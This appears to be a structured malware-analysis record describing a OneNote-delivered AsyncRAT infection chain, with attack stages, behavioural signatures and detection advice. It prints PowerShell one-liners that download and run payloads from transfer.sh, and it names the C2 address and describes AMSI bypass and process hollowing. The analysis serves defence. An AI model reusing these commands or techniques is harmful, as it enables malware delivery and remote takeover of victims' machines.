package_info.package_versions: N/A (malicious campaign, not a versioned package)
package_info.why_malicious: The entire package is a multi-stage malware delivery chain leveraging a malicious Microsoft OneNote file to execute a series of scripts and binaries that ultimately deploy AsyncRAT, a remote access trojan, on the victim's system. The chain uses social engineering, fileless techniques, anti-analysis, and process hollowing to evade detection and gain full control of the victim's device.

malicious_snippets.code_snippet: start powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://transfer.sh/get/sxSJuL/lo.bat' -OutFile 'Io.bat'; start Io.bat"
malicious_snippets.code_behavior: Upon user interaction, the code downloads a secondary BAT file (Io.bat) from a remote server using PowerShell and executes it, enabling the next stage of the attack.

malice_analysis.why_suspicious: Downloading and executing remote scripts from a user-triggered document is a classic malware delivery technique.
malice_analysis.violated_expectations: Normal OneNote attachments should not execute scripts that download and run further code from the internet.
malice_analysis.similar_legitimate_use: Automated software updaters may download and execute scripts, but not from untrusted sources or via user interaction in documents.
key_indicators: PowerShell used to download and execute remote code
Execution triggered by user interaction in a document
Use of transfer.sh (file sharing service) as a payload host

malicious_snippets.code_snippet: powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://transfer.sh/get/IKRQSd/view.zip' -OutFile 'view.zip'; Expand-Archive -Path 'view.zip' -DestinationPath '.'; start view.exe"
malicious_snippets.code_behavior: At runtime, the code downloads a ZIP archive containing an executable (view.exe), extracts it, and executes the extracted binary, advancing the infection chain.

malice_analysis.why_suspicious: Chained download and execution of binaries from remote sources is a hallmark of staged malware delivery.
malice_analysis.violated_expectations: Legitimate scripts should not download and execute arbitrary binaries from the internet without user consent or validation.
malice_analysis.similar_legitimate_use: Enterprise deployment scripts may automate downloads, but from trusted, authenticated sources.
key_indicators: PowerShell used for file download and extraction
Use of transfer.sh for payload delivery

malicious_snippets.code_snippet: Load resource 'CABINET' from RCData; decompress CAB file; write to '%temp%\IXP004.TMP\fresh.bat'; CreateProcessA('cmd /c fresh.bat')
malicious_snippets.code_behavior: At runtime, the binary loads an embedded CAB resource, decompresses it to a batch file (fresh.bat) in a temp directory, and executes it, continuing the infection chain.

malice_analysis.why_suspicious: Loading and executing embedded resources is a common malware obfuscation and staging technique.
malice_analysis.violated_expectations: Legitimate installers may extract resources, but not to execute further obfuscated scripts without user knowledge.
malice_analysis.similar_legitimate_use: Self-extracting installers may use similar techniques, but with user consent and transparency.
key_indicators: Execution of batch file from temp directory

malicious_snippets.code_behavior: At runtime, the script copies PowerShell.exe to the current directory as fresh.bat.exe and uses it to execute obfuscated PowerShell code that reads, decodes, decrypts, and decompresses a PE file from the batch file, then executes it in memory.

malice_analysis.why_suspicious: Copying system binaries and using them to execute obfuscated, fileless payloads is a known evasion and persistence technique.
malice_analysis.violated_expectations: Normal batch scripts should not self-replicate system binaries or execute obfuscated, in-memory payloads.
malice_analysis.similar_legitimate_use: Rare in legitimate use; sometimes used in penetration testing or advanced deployment scripts.

malicious_snippets.code_snippet: [PowerShell code that reads lines starting with ':: ' from fresh.bat, decodes, decrypts, decompresses to PE, and executes via EntryPoint()]
malicious_snippets.code_behavior: At runtime, the code reads encoded PE data from the batch file, decodes and decrypts it, decompresses it in memory, and executes the resulting .NET PE file (tmp72AF.tmp) filelessly.

malice_analysis.why_suspicious: Fileless in-memory execution of PE files is a sophisticated malware technique to evade disk-based detection.
malice_analysis.violated_expectations: Legitimate scripts should not execute hidden, encoded binaries from within themselves.
malice_analysis.similar_legitimate_use: Red teamers and advanced sysadmins may use similar techniques for legitimate in-memory execution.
key_indicators: Reading and decoding PE from script comments

malicious_snippets.code_behavior: At runtime, the code performs anti-debugging checks, disables Windows AMSI scanning, decrypts and decompresses two embedded modules, and launches the next-stage payload (payload.exe) using process injection.

malice_analysis.why_suspicious: Anti-analysis, AMSI bypass, and staged decryption are advanced malware behaviors.
malice_analysis.violated_expectations: Legitimate .NET applications do not disable security features or decrypt and execute hidden payloads.
malice_analysis.similar_legitimate_use: Penetration testing frameworks may use similar anti-analysis and injection techniques.

malicious_snippets.code_behavior: At runtime, the code creates a suspended notepad.exe process with explorer.exe as parent, injects the AsyncRAT client and shellcode, queues the shellcode for execution, and resumes the process, achieving process hollowing and stealthy RAT deployment.

malice_analysis.why_suspicious: Process hollowing and parent process spoofing are advanced malware evasion techniques.
malice_analysis.violated_expectations: Legitimate software does not inject code into system processes or manipulate process trees for stealth.
malice_analysis.similar_legitimate_use: Red team tools and some security products may use process injection for testing.

malicious_snippets.code_snippet: // AsyncRAT main loop: decrypt config, connect to C2 (95.216.102.32:6606, 7707, 8808) over SSL, send ClientInfo, await and execute remote commands (fileManager, keyLogger, webcam, shell, etc.)
malicious_snippets.code_behavior: At runtime, the RAT decrypts its configuration, establishes an SSL connection to the C2 server, sends victim info, and awaits remote commands to fully control the system, exfiltrate data, and perform surveillance.

malice_analysis.why_suspicious: Remote access, data exfiltration, and surveillance are core RAT behaviors.
malice_analysis.violated_expectations: No legitimate software should provide full remote control to an untrusted third party.
malice_analysis.similar_legitimate_use: Remote administration tools, but only with user consent and legitimate use.
key_indicators: Keylogging, webcam, and file management features
Multiple C2 ports and encrypted config

attack_chain.action: User receives phishing email with malicious OneNote attachment.
User opens OneNote file and double-clicks embedded image, triggering execution of viewn.bat.
Io.bat downloads view.zip, extracts view.exe, and executes it.
view.exe extracts fresh.bat from embedded CAB resource and executes it.
fresh.bat copies PowerShell.exe, runs obfuscated PowerShell code to decode and execute fileless .NET PE (tmp72AF.tmp).
tmp72AF.tmp performs anti-analysis, disables AMSI, decrypts and launches payload.exe using runpe.dll.
payload.exe performs process hollowing, injects AsyncRAT into notepad.exe, and resumes execution.
AsyncRAT connects to C2, exfiltrates data, and awaits remote commands.
attack_chain.leads_to: Full remote control of victim's device.

behavioral_signatures: Execution of BAT files embedded in OneNote attachments
PowerShell scripts downloading and executing remote BAT/ZIP/EXE files
Extraction and execution of resources from within executables
Copying and renaming PowerShell.exe for obfuscated execution
Fileless in-memory execution of .NET PE files
AMSI bypass and anti-debugging checks in .NET processes
Process hollowing and parent process spoofing (explorer.exe -> notepad.exe)
Suspicious outbound SSL connections to known C2 IPs/ports
detection_knowledge.how_to_detect: Monitor for execution of BAT files from OneNote attachments and subsequent PowerShell activity that downloads and executes remote files. Detect extraction and execution of embedded resources in executables, especially those writing to temp directories. Watch for copying and renaming of PowerShell.exe, and in-memory execution of .NET PE files. Alert on AMSI bypass and anti-debugging code in .NET processes. Flag process hollowing and parent process spoofing, particularly notepad.exe launched as a child of explorer.exe in a suspended state. Correlate with outbound SSL connections to known AsyncRAT C2 IPs and ports. Use file hashes and network IOCs for additional detection.
